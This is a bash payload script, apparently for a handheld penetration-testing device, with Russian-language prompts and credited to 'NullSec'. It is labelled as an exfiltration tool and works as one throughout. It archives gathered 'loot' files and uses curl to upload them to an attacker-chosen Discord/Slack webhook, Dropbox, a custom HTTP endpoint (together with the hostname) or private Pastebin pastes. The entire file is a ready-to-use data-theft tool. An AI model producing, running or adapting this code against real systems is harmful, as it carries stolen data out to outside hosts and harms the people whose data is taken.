#!/bin/bash
. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
. /root/payloads/library/nullsec-ui.sh
# Title: Облачный Экфиль
# Author: NullSec
# Description: Экспортирует собранные данные в облачные хранилища
# Category: nullsec/exfiltration

LOOT_DIR="/mmc/nullsec/cloudexfil"
mkdir -p "$LOOT_DIR"

PROMPT "ОБЛАЧНЫЙ ЭКСФИЛЬТРАТ

Загрузить собранные данные
в облачное хранилище для
безопасного доступа.

Поддерживает:
- Webhook (Discord/Slack)
- Dropbox API
- Пользовательский HTTP
- Pastebin

Нажмите OK для настройки."

# Проверка подключения
if ! ping -c 1 -W 2 8.8.8.8 >/dev/null 2>&1; then
    ERROR_DIALOG "Нет подключения к интернету!

Облачный эксфильт требует
рабочего WAN-канала.
Проверьте соединение."
    exit 1
fi

LOG "Подключение к интернету подтверждено"

PROMPT "МЕТОД ЗАГРУЗКИ:

1. Webhook (Discord/Slack)
2. Dropbox API
3. Пользовательский HTTP POST
4. Pastebin

Выберите метод."

METHOD=$(NUMBER_PICKER "Метод (1-4):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) METHOD=1 ;; esac
[ "$METHOD" -lt 1 ] && METHOD=1
[ "$METHOD" -gt 4 ] && METHOD=4

ENDPOINT=$(TEXT_PICKER "URL эндпоинта:" "https://hooks.slack.com/services/xxx")
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) ENDPOINT="" ;; esac

[ -z "$ENDPOINT" ] && { ERROR_DIALOG "Не указан URL эндпоинта!

Требуется URL для загрузки."; exit 1; }

# Необязательный ключ API для Dropbox/Pastebin
API_KEY=""
if [ "$METHOD" -eq 2 ] || [ "$METHOD" -eq 4 ]; then
    API_KEY=$(TEXT_PICKER "API ключ/токен:" "")
    case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) API_KEY="" ;; esac
    [ -z "$API_KEY" ] && { ERROR_DIALOG "Для этого метода загрузки требуется API ключ."; exit 1; }
fi

PROMPT "ИСТОЧНИК ДАННЫХ:

1. Все данные /mmc/nullsec/
2. Только последняя сессия
3. Данные конкретной полезной нагрузки
4. Пользовательский путь

Выберите источник."

SOURCE=$(NUMBER_PICKER "Источник (1-4):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) SOURCE=1 ;; esac

case $SOURCE in
    1) LOOT_PATH="/mmc/nullsec" ;;
    2) LOOT_PATH=$(ls -dt /mmc/nullsec/*/session_* 2>/dev/null | head -1)
       [ -z "$LOOT_PATH" ] && LOOT_PATH="/mmc/nullsec" ;;
    3) PAYLOAD_NAME=$(TEXT_PICKER "Имя полезной нагрузки:" "datavacuum")
       LOOT_PATH="/mmc/nullsec/$PAYLOAD_NAME" ;;
    4) LOOT_PATH=$(TEXT_PICKER "Пользовательский путь:" "/mmc/nullsec") ;;
esac

[ ! -d "$LOOT_PATH" ] && { ERROR_DIALOG "Путь к данным не найден!

$LOOT_PATH не существует."; exit 1; }

LOOT_SIZE=$(du -sh "$LOOT_PATH" 2>/dev/null | awk '{print $1}')
FILE_COUNT=$(find "$LOOT_PATH" -type f 2>/dev/null | wc -l | tr -d ' ')

resp=$(CONFIRMATION_DIALOG "НАЧАТЬ ЭКСФИЛЬТРАЦИЮ?

Источник: $LOOT_PATH
Файлы: $FILE_COUNT
Размер: $LOOT_SIZE
Метод: $METHOD
Эндпоинт: ${ENDPOINT:0:30}...

Нажмите OK для загрузки.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

TIMESTAMP=$(date +%Y%m%d_%H%M%S)
ARCHIVE="/tmp/exfil_$TIMESTAMP.tar.gz"
UPLOAD_LOG="$LOOT_DIR/upload_$TIMESTAMP.log"

LOG "Архивация данных из $LOOT_PATH"
SPINNER_START "Архивация данных..."
tar czf "$ARCHIVE" -C "$(dirname "$LOOT_PATH")" "$(basename "$LOOT_PATH")" 2>/dev/null
SPINNER_STOP

ARCHIVE_SIZE=$(du -sh "$ARCHIVE" 2>/dev/null | awk '{print $1}')
LOG "Архив создан: $ARCHIVE_SIZE"

SPINNER_START "Загрузка в облако..."
UPLOAD_OK=0

case $METHOD in
    1) # Webhook
        RESULT=$(curl -s -o /dev/null -w "%{http_code}" \
            -F "file=@$ARCHIVE" \
            -F "content=NullSec Exfil $(date)" \
            "$ENDPOINT" 2>&1)
        [ "$RESULT" -ge 200 ] && [ "$RESULT" -lt 300 ] && UPLOAD_OK=1
        ;;
    2) # Dropbox
        RESULT=$(curl -s -o /dev/null -w "%{http_code}" \
            -X POST "$ENDPOINT" \
            -H "Authorization: Bearer $API_KEY" \
            -H "Content-Type: application/octet-stream" \
            -H "Dropbox-API-Arg: {\"path\":\"/exfil_$TIMESTAMP.tar.gz\"}" \
            --data-binary "@$ARCHIVE" 2>&1)
        [ "$RESULT" -ge 200 ] && [ "$RESULT" -lt 300 ] && UPLOAD_OK=1
        ;;
    3) # Custom HTTP POST
        RESULT=$(curl -s -o /dev/null -w "%{http_code}" \
            -X POST "$ENDPOINT" \
            -F "file=@$ARCHIVE" \
            -F "hostname=$(cat /proc/sys/kernel/hostname)" \
            -F "timestamp=$TIMESTAMP" 2>&1)
        [ "$RESULT" -ge 200 ] && [ "$RESULT" -lt 300 ] && UPLOAD_OK=1
        ;;
    4) # Pastebin (text files only, splits)
        TEXT_DATA=$(find "$LOOT_PATH" -name "*.txt" -o -name "*.log" | head -5 | xargs cat 2>/dev/null | head -c 50000)
        RESULT=$(curl -s -o /dev/null -w "%{http_code}" \
            -X POST "https://pastebin.com/api/api_post.php" \
            -d "api_dev_key=$API_KEY" \
            -d "api_option=paste" \
            -d "api_paste_private=1" \
            --data-urlencode "api_paste_code=$TEXT_DATA" 2>&1)
        [ "$RESULT" -ge 200 ] && [ "$RESULT" -lt 300 ] && UPLOAD_OK=1
        ;;
esac

SPINNER_STOP

# Удаление временного архива
rm -f "$ARCHIVE"

# Запись результата
echo "[$TIMESTAMP] Method=$METHOD Upload=$([ $UPLOAD_OK -eq 1 ] && echo OK || echo FAIL) Files=$FILE_COUNT Size=$LOOT_SIZE" >> "$UPLOAD_LOG"

if [ "$UPLOAD_OK" -eq 1 ]; then
    LOG "Облачный эксфильт прошел успешно"
    PROMPT "ЭКСФИЛЬТ ЗАВЕРШЕН

Загрузка: УСПЕХ
Файлы: $FILE_COUNT
Архив: $ARCHIVE_SIZE
Метод: $METHOD

Журнал: $UPLOAD_LOG"
else
    LOG "Облачный эксфильт НЕ удался"
    ERROR_DIALOG "ОШИБКА ЗАГРУЗКИ

HTTP ответ: $RESULT
Проверьте URL эндпоинта и
учетные данные API.

Журнал: $UPLOAD_LOG"
fi
